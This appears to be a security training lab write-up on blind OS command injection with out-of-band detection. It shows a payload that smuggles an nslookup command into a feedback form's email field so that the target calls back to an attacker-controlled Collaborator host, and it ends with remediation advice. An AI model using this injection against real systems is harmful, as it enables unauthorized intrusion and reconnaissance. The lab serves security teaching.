# Lab: Blind OS command injection with out-of-band interaction

When the response tells you nothing and there is no file you can read back, the last reliable signal is outbound traffic to a host you control. This lab is that pivot, and it is the foundation for the data exfiltration lab that follows.

## The setup

Feedback form again: `POST /feedback/submit`, `email` vulnerable, output discarded. There is no web-served directory you can write to here, so the redirection trick from the previous lab has nothing to target. The target does have outbound network access, which is the assumption every out-of-band attack depends on.

## How the vulnerability works

The injected command inherits the network access of the web server. If it makes a DNS or HTTP request to a domain whose name servers belong to you, the request itself is the evidence: it can only have come from your command. Burp Collaborator gives you exactly that, a unique subdomain on Burp's name servers plus an HTTP listener, with every lookup logged.

This works even when there is no readable output, because the leak is the access itself.

## Solving it

1. Open the Burp Collaborator client and click "Copy to clipboard" to get a payload subdomain. It is unique to you and changes each time you generate one.
2. Inject a command that resolves it:

```
email=x||nslookup YOUR-COLLABORATOR-SUBDOMAIN||
```

3. Send the request.
4. Return to the Collaborator tab and click "Poll now". A DNS lookup from the target appears within a few seconds.

## Why that payload works

`nslookup <name>` makes the target's resolver ask for that name. The authoritative name server for the Collaborator domain is Burp's, so the query reaches Burp and is logged with the source IP of the target. That is a direct hit: the shell ran, and it ran `nslookup`.

The important property is uniqueness. The subdomain was generated for this attempt, so a logged lookup for it cannot be incidental traffic. The only way it gets requested is through your injected command.

## The fix

Same cause as the timing and redirection labs: user input is concatenated into a shell command. Build the command from an argument list instead, with no shell involved, and validate the field as what it should be, an email address. Restrict the host's outbound egress so a hijacked command cannot reach arbitrary names.
